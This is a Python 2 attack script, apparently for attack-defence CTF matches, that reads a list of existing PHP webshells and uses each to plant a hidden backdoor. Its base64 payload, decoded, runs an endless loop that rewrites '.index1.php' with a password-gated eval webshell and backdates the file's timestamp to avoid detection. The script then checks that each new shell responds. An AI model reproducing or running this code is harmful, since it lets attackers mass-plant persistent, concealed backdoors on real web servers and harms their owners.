#!/usr/bin/python
#coding=utf-8
import sys,requests
'''
作用：向靶机发命令来写文件，文件名.index1.php
webshell.txt 格式如下：
http://127.0.0.1:80/1110/x.php,xost,x
http://127.0.0.2/1110/xx.php,POST,x
http://127.0.0.3/1011/x.php,get,3
http://192.168.1.155/1110/x.php,post,x
http://127.0.0.1/1110/y.php?pass=Sn3rtf4ck,get,a
'''

def loadfile(filepath):
	try : 
		file = open(filepath,"rb")
		return str(file.read())
	except : 
		print "File %s Not Found!" %filepath
		sys.exit()

def cmd(url,method,passwd):
	#分割url ip 127.0.0.1:80 Rfile=/1111/x.php?pass=Sn3rtf4ck
	try:
		url.index("http")
		#去除http://   ==> 127.0.0.1:80/1110/x.php
		urlstr=url[7:]
		lis = urlstr.split("/")
		ip=str(lis[0])
		Rfile = ""
		for i in range(1,len(lis)):
			Rfile = Rfile+"/"+str(lis[i])
	except :
		urlstr=url[8:]
		lis = urlstr.split("/")
		ip=str(lis[0])
		Rfile = ""
		for i in range(1,len(lis)):
			Rfile = Rfile+"/"+str(lis[i])
	#判断shell是否存在
	try :
		res = requests.get(url,timeout=3)
	except : 
		print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
		return 0
	if res.status_code!=200 :
		print "[-] %s Page Not Found!" %url
		return 0
	#执行命令 system,exec,passthru,`,shell_exec
	#a=@eval(base64_decode($_GET[z0]));&z0=c3lzdGVtKCJ3aG9hbWkiKTs=
	data={}
	if method=='get':
		data[passwd]='@eval(base64_decode($_GET[z0]));'
		data['z0']='c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9QT1NUW3Bhc3NdKT09IjNhNTAwNjVlMTcwOWFjYzQ3YmEwYzkyMzgyOTQzNjRmIil7QGV2YWwoJF9QT1NUW2FdKTt9ID8+XCcgPi5pbmRleDEucGhwO3RvdWNoIC1tIC1kICIyMDE3LTExLTE3IDEwOjIxOjI2IiAuaW5kZXgxLnBocDtzbGVlcCA1O2RvbmU7Jyk7'
		try:
			res = requests.get(url,params=data,timeout=3)
		except :
			pass
	elif method=='post':
		data['pass']="Sn3rtf4ck"
		data[passwd]='@eval(base64_decode($_POST[z0]));'
		data['z0']='c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9QT1NUW3Bhc3NdKT09IjNhNTAwNjVlMTcwOWFjYzQ3YmEwYzkyMzgyOTQzNjRmIil7QGV2YWwoJF9QT1NUW2FdKTt9ID8+XCcgPi5pbmRleDEucGhwO3RvdWNoIC1tIC1kICIyMDE3LTExLTE3IDEwOjIxOjI2IiAuaW5kZXgxLnBocDtzbGVlcCA1O2RvbmU7Jyk7'
		try:
			res = requests.post(url,data=data,timeout=3)
		except:
			pass
	#print res.status_code
	'''
	if res.status_code!=200 :
		print "[-] %s commad exec failed!" %url
		return 0
	'''

	#检查shell是否存在。
	list=Rfile.split("/")
	b_url="http://"+ip
	max = len(list)-1
	for i in range(1,max):
		b_url=b_url+"/"+list[i]
	shell_url = b_url+"/.index1.php"
	res = requests.get(shell_url,timeout=3)
	if res.status_code!=200:
		print "[-] %s create shell failed!" %shell_url
		return 0
	else :
		print '[+] %s sucessed!' %shell_url


if __name__ == '__main__':
	shellstr=loadfile("./webshell.txt")
	list = shellstr.split("\r\n")
	#print str(list)
	i = 0
	url={}
	passwd={}
	method={}
	for data in list:
		if data:
			ls = data.split(",")
			method_tmp = str(ls[1])
			method_tmp = method_tmp.lower()
			if method_tmp=='post' or method_tmp=='get':
				url[i]=str(ls[0])
				method[i]=method_tmp
				passwd[i]=str(ls[2])
				i+=1
			else :
				print "[-] %s request method error!" %(str(ls[0]))
		else : pass
	#print str(len(url))
	for j in range(len(url)):
		#调用执行命令的模块
		#print str(j)
		#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
		cmd(url=url[j],method=method[j],passwd=passwd[j])
